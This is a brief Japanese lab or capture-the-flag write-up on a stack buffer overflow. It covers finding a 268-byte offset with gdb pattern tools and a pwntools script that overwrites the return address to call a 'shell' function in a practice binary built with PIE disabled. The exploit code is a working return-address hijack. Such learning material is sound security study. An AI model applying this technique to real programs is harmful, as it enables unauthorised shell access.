# overflow
バッファオーバーフローを利用して、プログラムに存在する関数を呼び出す。
ここではシェルを開く関数shellを用意した。
PIEが無効になっているのでアドレスは変動しないので、pwntoolsかreadelfで解析して直接アドレスを知ることができる。
gdbで入力した文字列がリターンアドレスを書き換える位置を特定する。
pattcとpattoが使える。
この場合268だった。
したがって、最初に268バイト分パディングして、次に呼び出したい関数のアドレスを指定すればいい。
引数が必要ならリターンアドレスの後に順に入れていけばよいはず。

```py
from pwn import *

trg = ELF('overflow')
retaddr = trg.symbols['shell']
offset = 268

payload = 'A' * offset
payload += p32(retaddr)

p = process('overflow')
p.sendline(payload)
p.interactive()
```
